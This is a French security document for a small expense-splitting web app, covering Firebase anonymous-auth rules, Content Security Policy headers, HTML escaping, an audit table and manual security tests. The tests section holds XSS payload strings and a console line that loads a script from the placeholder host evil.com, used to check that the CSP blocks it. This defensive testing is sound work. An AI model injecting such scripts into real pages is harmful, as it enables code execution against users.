# 🔐 Sécurité - Split-ChargeProrata

> **Version** : 2.1.0-firebase-auth | **Date** : 2026-01-27

---

## 🛡️ Couches de Sécurité

L'application implémente **plusieurs couches de sécurité** :

1. ✅ **Authentification Firebase Anonyme** - Bloque accès direct à Firebase
2. ✅ **Content Security Policy (CSP)** - Bloque scripts/ressources malveillants
3. ✅ **Protection XSS** - Échappement HTML de toutes entrées
4. ✅ **Validation entrées** - Limites sur montants (max 100k€)
5. ✅ **Stockage sécurisé** - Try/catch sur localStorage
6. ✅ **Données anonymes** - Aucune information personnelle

---

## 🔐 Authentification Firebase Anonyme (v2.1.0+)

### Comment ça fonctionne

```javascript
// Au lancement de l'application
1. Initialisation Firebase Auth
2. signInAnonymously() appelé automatiquement
3. Firebase génère un UID unique (ex: "a7b2c3d4e5f6...")
4. Avec cet UID, l'app peut accéder à Realtime Database
5. Sans authentification → Accès refusé par Firebase
```

### Règles Firebase

```json
{
  "rules": {
    ".read": "auth != null",
    ".write": "auth != null"
  }
}
```

**Signification** :
- `auth != null` : Utilisateur doit être authentifié (même anonymement)
- Sans authentification via l'app → **Accès Firebase refusé**

### Avantages Sécurité

✅ **Bloque accès direct à Firebase** :
- Quelqu'un qui obtient l'URL Firebase ne peut PAS accéder directement
- Doit exécuter l'application (qui fait l'authentification automatique)
- Bloque curl/Postman/scripts malveillants

✅ **Transparent pour l'utilisateur** :
- Aucun login/password requis
- Authentification automatique en arrière-plan
- UX fluide sans friction

✅ **Compatible hors ligne** :
- Si Firebase indisponible → Fallback localStorage
- Application continue de fonctionner localement

### Limites

⚠️ **Protection limitée si HTML compromis** :
- Si quelqu'un obtient le fichier HTML complet, il peut l'exécuter
- **Mais** : Pour usage couple (2 smartphones privés), c'est suffisant

⚠️ **Pas de contrôle d'accès par utilisateur** :
- Tous appareils authentifiés ont mêmes droits
- Pas de distinction vous/conjointe
- Pour traçabilité : utiliser Google Sign-In

---

## Content Security Policy (CSP)

Le fichier HTML intègre une **Content Security Policy** stricte pour protéger contre les injections de code malveillant.

### Version autonome (`Split-ChargeProrata.html`)

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src 'self' data:; font-src 'self'; base-uri 'self'; form-action 'self';"
/>
```

**Directives** :

- `default-src 'none'` - Bloque toutes les ressources par défaut
- `script-src 'unsafe-inline'` - Autorise uniquement les scripts inline (nécessaire pour single-file)
- `style-src 'unsafe-inline'` - Autorise uniquement les styles inline (nécessaire pour single-file)
- `img-src 'self' data:` - Autorise images locales et data URIs (pour SVG inline)
- `font-src 'self'` - Autorise polices locales uniquement
- `base-uri 'self'` - Empêche modification de la balise `<base>`
- `form-action 'self'` - Empêche soumission de formulaires vers domaines externes

### Version modulaire (`Split-ChargeProrata-modular.html`)

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; base-uri 'self'; form-action 'self';"
/>
```

**Différences** :

- `script-src 'self'` - Scripts externes autorisés (script.js)
- `style-src 'self'` - Styles externes autorisés (styles.css)
- ✅ **Plus sécurisé** car bloque complètement les scripts/styles inline

### Ce que la CSP bloque

❌ **Bloqué par la CSP** :

- Chargement de scripts externes depuis CDN (ex: `<script src="https://cdn.example.com/malicious.js">`)
- Injection de code JavaScript dans les attributs HTML (ex: `<img onerror="alert('XSS')">`)
- Chargement de styles CSS malveillants depuis domaines externes
- Redirection vers des sites externes via formulaires
- Modification de l'URL de base du document

✅ **Autorisé par la CSP** :

- Scripts et styles inline (version autonome) ou fichiers locaux (version modulaire)
- Images locales et SVG inline (data URIs)
- Sauvegarde dans localStorage (aucune connexion réseau)

## Protections XSS implémentées

### 1. Échappement HTML (`escapeHtml()`)

Tous les contenus utilisateur sont échappés avant affichage :

```javascript
function escapeHtml(unsafe) {
  if (!unsafe) return '';
  const div = document.createElement('div');
  div.textContent = unsafe;
  return div.innerHTML;
}
```

**Protection contre** :

- `<script>alert('XSS')</script>` → `&lt;script&gt;alert('XSS')&lt;/script&gt;`
- `<img src=x onerror=alert(1)>` → `&lt;img src=x onerror=alert(1)&gt;`

### 2. Utilisation de `createElement()` au lieu de `innerHTML`

La fonction `addCharge()` crée les éléments DOM via API sécurisée :

```javascript
const inputDesc = document.createElement('input');
inputDesc.type = 'text';
inputDesc.className = 'charge-desc';
inputDesc.placeholder = 'ex: EDF';
cellDesc.appendChild(inputDesc);
```

**Évite** : Injection via `innerHTML` avec contenu malveillant

### 3. Validation stricte des entrées

Tous les montants sont validés avec limites maximales :

```javascript
function validateAmount(value, fieldName, max = 100000) {
  if (isNaN(value) || value === null || value === '') {
    alert(`⚠️ ${fieldName} : valeur invalide`);
    return false;
  }
  if (value < 0 || value > max) return false;
  return true;
}
```

**Limites** :

- Salaires : 100 000 € maximum
- Charges : 50 000 € maximum

### 4. localStorage sécurisé

Fonctions `safeSaveToLocalStorage()` et `safeLoadFromLocalStorage()` avec :

- Try/catch pour gérer quota dépassé
- Gestion mode navigation privée
- Parsing JSON sécurisé avec fallback
- Gestion des données corrompues

## Audit de sécurité

### ✅ Vulnérabilités corrigées

| Vulnérabilité            | Statut     | Mitigation                         |
| ------------------------ | ---------- | ---------------------------------- |
| XSS via innerHTML        | ✅ Corrigé | `createElement()` + `escapeHtml()` |
| XSS via attributs HTML   | ✅ Corrigé | CSP bloque inline event handlers   |
| Injection script externe | ✅ Corrigé | CSP `script-src` restrictif        |
| localStorage crash       | ✅ Corrigé | Try/catch avec fallback            |
| Valeurs absurdes         | ✅ Corrigé | Validation limites (100k€ / 50k€)  |
| Données corrompues       | ✅ Corrigé | JSON.parse sécurisé                |

### 🔒 Bonnes pratiques respectées

- ✅ Aucune donnée transmise sur le réseau
- ✅ Aucun tracking ou analytics
- ✅ Pas de credentials en dur
- ✅ Validation côté client complète
- ✅ Code JavaScript documenté (JSDoc)
- ✅ Principe du moindre privilège (CSP)

## Tests de sécurité

Pour tester la sécurité de l'application :

### Test XSS basique

1. Ajouter une charge avec description : `<script>alert('XSS')</script>`
2. Calculer la répartition
3. Vérifier l'historique

**Résultat attendu** : Le script est échappé et affiché comme texte, pas exécuté.

### Test CSP

1. Ouvrir la console développeur (F12)
2. Tenter d'exécuter : `var s = document.createElement('script'); s.src='https://evil.com/malicious.js'; document.body.appendChild(s);`

**Résultat attendu** (version modulaire) :

```
Refused to load the script 'https://evil.com/malicious.js' because it violates the following Content Security Policy directive: "script-src 'self'".
```

### Test localStorage

1. Remplir le localStorage jusqu'à saturation (mode navigation privée ou quota atteint)
2. Tenter de sauvegarder des données

**Résultat attendu** : Notification "⚠️ Impossible de sauvegarder (stockage plein ou désactivé)" sans crash.

## Signalement de vulnérabilité

Si vous découvrez une vulnérabilité de sécurité, merci de :

1. NE PAS la divulguer publiquement
2. Contacter l'auteur : Richie Bigot-Scoarnec
3. Fournir une description détaillée et un PoC (Proof of Concept) si possible

---

**Dernière mise à jour** : 2026-01-26
